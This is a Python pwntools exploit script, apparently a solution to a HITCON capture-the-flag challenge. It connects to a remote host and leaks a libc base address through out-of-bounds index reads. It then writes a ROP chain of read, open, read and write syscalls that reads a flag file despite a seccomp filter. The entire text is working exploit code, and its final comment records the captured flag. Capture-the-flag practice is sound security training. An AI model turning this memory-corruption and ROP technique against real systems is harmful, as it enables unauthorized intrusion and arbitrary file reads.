#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

r = remote("52.192.178.153", 31337)
libc = ELF("./libc.so.6")

def R(idx):
    r.sendlineafter("Choice?\n", "1")
    r.sendlineafter("Idx?\n", str(idx))
    return int(r.recvline().split()[-1])

def W(idx, val):
    r.sendlineafter("Choice?\n", "2")
    r.sendlineafter("Idx?\n", str(idx))
    r.sendlineafter("Give me your number:\n", str(val))

libc_base = R(203) - 0x203f1
log.info("libc_base = " + hex(libc_base))

pop_rax = libc_base + 0x3a998
pop_rdi = libc_base + 0x1fd7a
pop_rsi = libc_base + 0x1fcbd
pop_rdx = libc_base + 0x1b92
syscall = libc_base + 0xbc765
buf = libc_base + 0x3C5FF6

rop = [
    # read(0, buf, 100)
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, buf,
    pop_rdx, 128,
    syscall,

    # open(buf, 0, 2)
    pop_rax, 2,
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx, 2,
    syscall,

    # read(3, buf, 100)
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, buf,
    pop_rdx, 100,
    syscall,

    # write(1, buf, 100)
    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, buf,
    pop_rdx, 100,
    syscall,
]

for i, x in enumerate(rop):
    W(203 + i, x)

r.sendlineafter("Choice?\n", "3")
r.send("/home/artifact/flag\x00".ljust(100, "\x00"))
r.interactive()

# hitcon{why_libseccomp_cheated_me_Q_Q}

